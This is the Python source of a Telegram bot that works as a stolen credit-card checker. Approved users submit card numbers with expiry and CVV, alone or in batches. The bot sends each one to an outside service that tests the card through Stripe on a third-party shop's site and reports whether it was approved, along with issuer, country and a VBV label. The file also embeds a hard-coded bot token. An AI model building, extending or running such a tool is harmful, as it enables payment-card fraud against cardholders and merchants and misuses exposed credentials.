import logging
import requests
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, MessageHandler, filters
import os

BOT_TOKEN = "8211876425:AAEhdEp_Qa70R_nwHpsMx2nNAc9ZtTwjDBE"
ADMIN_IDS = [7299213012]  # Add your Telegram user ID here

APPROVED_FILE = "approved_users.txt"

logging.basicConfig(level=logging.INFO)

VBV_BINS = [
    "421765", "400551", "402400", "430587",
    "510510", "520082", "550690", "542418"
]

def get_vbv_status(cc_number):
    bin6 = cc_number[:6]
    return "VBV ✅" if bin6 in VBV_BINS else "NON-VBV ❌"

def get_approved_users():
    if not os.path.exists(APPROVED_FILE):
        return []
    with open(APPROVED_FILE, "r") as f:
        return [int(line.strip()) for line in f if line.strip().isdigit()]

def save_approved_users(user_ids):
    with open(APPROVED_FILE, "w") as f:
        for uid in user_ids:
            f.write(f"{uid}\n")

async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ You are not admin.")
        return
    if not context.args:
        await update.message.reply_text("Usage: /approve <user_id>")
        return
    user_id = int(context.args[0])
    users = get_approved_users()
    if user_id not in users:
        users.append(user_id)
        save_approved_users(users)
        await update.message.reply_text(f"✅ User {user_id} approved.")
    else:
        await update.message.reply_text("User already approved.")

async def revoke(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ You are not admin.")
        return
    if not context.args:
        await update.message.reply_text("Usage: /revoke <user_id>")
        return
    user_id = int(context.args[0])
    users = get_approved_users()
    if user_id in users:
        users.remove(user_id)
        save_approved_users(users)
        await update.message.reply_text(f"🚫 User {user_id} revoked.")
    else:
        await update.message.reply_text("User was not approved.")

async def chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in get_approved_users():
        await update.message.reply_text("❌ You're not approved to use this bot.")
        return
    if not context.args:
        await update.message.reply_text("❌ Usage:\n/chk <card|mm|yy|cvv>")
        return
    cc = context.args[0].strip()
    await process_single_cc(update, cc)

async def mchk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in get_approved_users():
        await update.message.reply_text("❌ You're not approved to use this bot.")
        return
    if not context.args:
        await update.message.reply_text("❌ Usage:\n/mchk card1|mm|yy|cvv,card2|mm|yy|cvv,...")
        return

    raw = " ".join(context.args).replace("\n", " ").replace(",", " ")
    ccs = [cc.strip() for cc in raw.split() if "|" in cc]
    await update.message.reply_text(f"📦 Processing {len(ccs)} cards...")

    for cc in ccs[:10]:
        await process_single_cc(update, cc)

async def process_single_cc(update: Update, cc):
    cc_parts = cc.split("|")
    if len(cc_parts) != 4:
        await update.message.reply_text(f"❌ Invalid format:\n{cc}")
        return

    card_number = cc_parts[0]
    vbv_status = get_vbv_status(card_number)
    user = update.effective_user.username or update.effective_user.first_name or "Unknown"

    url = f"https://darkboy-auto-stripe.onrender.com/gateway=autostripe/key=darkboy/site=pixelpixiedesigns.com/cc={cc}"

    try:
        res = requests.get(url, timeout=10)
        data = res.text.strip().split("|")

        if len(data) < 7:
            await update.message.reply_text(f"⚠️ Unexpected response:\n{res.text}")
            return

        status, gateway, result, card_type, issuer, country, time = data

        if "approved" in status.lower():
            msg = f"""┏━━━━━━━⍟
┃ 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅
┗━━━━━━━━━━━⊛

⌯ 𝗖𝗮𝗿𝗱 ➳ {cc}
⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➳ {gateway}
⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➳ {result}
⌯ 𝗜𝗻𝗳𝗼 ➳ {card_type}
⌯ 𝐈𝐬𝐬𝐮𝐞𝐫 ➳ {issuer}
⌯ 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➳ {country}
⌯ 𝐕𝐁𝐕 𝐂𝐡𝐞𝐜𝐤 ➳ {vbv_status}
⌯ 𝐁𝐲 ➳ @{user}
⌯ 𝗧𝗶𝗺𝗲 ➳ {time}
"""
        else:
            msg = f"""┏━━━━━━━⍟
┃ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌
┗━━━━━━━━━━━⊛

⌯ 𝗖𝗮𝗿𝗱 ➳ {cc}
⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➳ {gateway}
⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➳ {result}
⌯ 𝗜𝗻𝗳𝗼 ➳ {card_type}
⌯ 𝐈𝐬𝐬𝐮𝐞𝐫 ➳ {issuer}
⌯ 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➳ {country}
⌯ 𝐕𝐁𝐕 𝐂𝐡𝐞𝐜𝐤 ➳ {vbv_status}
⌯ 𝐁𝐲 ➳ @{user}
⌯ 𝗧𝗶𝗺𝗲 ➳ {time}
"""
        await update.message.reply_text(msg[:4096])
    except Exception as e:
        await update.message.reply_text(f"⚠️ Error with {cc}:\n{str(e)}")


if __name__ == "__main__":
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("chk", chk))
    app.add_handler(CommandHandler("mchk", mchk))
    app.add_handler(CommandHandler("approve", approve))
    app.add_handler(CommandHandler("revoke", revoke))
    app.run_polling()